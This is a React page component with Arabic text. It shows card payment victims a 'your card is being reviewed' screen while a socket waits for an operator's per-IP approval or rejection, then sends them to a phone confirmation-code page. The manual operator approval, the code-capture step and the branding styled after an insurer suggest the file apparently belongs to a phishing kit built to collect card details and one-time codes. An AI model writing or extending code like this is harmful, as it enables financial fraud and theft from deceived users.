import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSocket } from '../../context/SocketContext';
import { Loader2, Clock, CheckCircle, XCircle } from 'lucide-react';
import '../../styles/pages/PaymentWaiting.css';

export default function PaymentWaiting() {
  const navigate = useNavigate();
  const { socket, userIp } = useSocket();
  const [status, setStatus] = useState('waiting'); // waiting, approved, rejected

  useEffect(() => {
    if (!socket || !userIp) return;

    // Listen for admin approval/rejection
    socket.on('paymentApproved', ({ ip }) => {
      if (ip === userIp) {
        setStatus('approved');
        setTimeout(() => {
          navigate('/phone-code');
        }, 2000);
      }
    });

    socket.on('paymentRejected', ({ ip }) => {
      if (ip === userIp) {
        setStatus('rejected');
        setTimeout(() => {
          navigate('/paydcc');
        }, 2000);
      }
    });

    return () => {
      socket.off('paymentApproved');
      socket.off('paymentRejected');
    };
  }, [socket, userIp, navigate]);

  return (
    <div className="payment-waiting-page">
      <div className="waiting-container">
        {status === 'waiting' && (
          <>
            <div className="waiting-icon">
              <Clock className="w-20 h-20 text-blue-600 animate-pulse" />
            </div>
            <h1 className="waiting-title">جاري مراجعة بطاقتك</h1>
            <p className="waiting-description">
              يرجى الانتظار بينما نقوم بالتحقق من بيانات البطاقة...
            </p>
            <div className="waiting-spinner">
              <Loader2 className="w-12 h-12 text-qiic-maroon animate-spin" />
            </div>
            <p className="waiting-note">
              قد تستغرق هذه العملية بضع لحظات
            </p>
          </>
        )}

        {status === 'approved' && (
          <>
            <div className="waiting-icon">
              <CheckCircle className="w-20 h-20 text-green-600" />
            </div>
            <h1 className="waiting-title text-green-600">تمت الموافقة!</h1>
            <p className="waiting-description">
              تم قبول بطاقتك بنجاح. جاري الانتقال لإدخال رمز التأكيد...
            </p>
          </>
        )}

        {status === 'rejected' && (
          <>
            <div className="waiting-icon">
              <XCircle className="w-20 h-20 text-red-600" />
            </div>
            <h1 className="waiting-title text-red-600">تم الرفض</h1>
            <p className="waiting-description">
              عذراً، لم يتم قبول بيانات البطاقة. جاري إعادتك لصفحة الدفع...
            </p>
          </>
        )}
      </div>
    </div>
  );
}
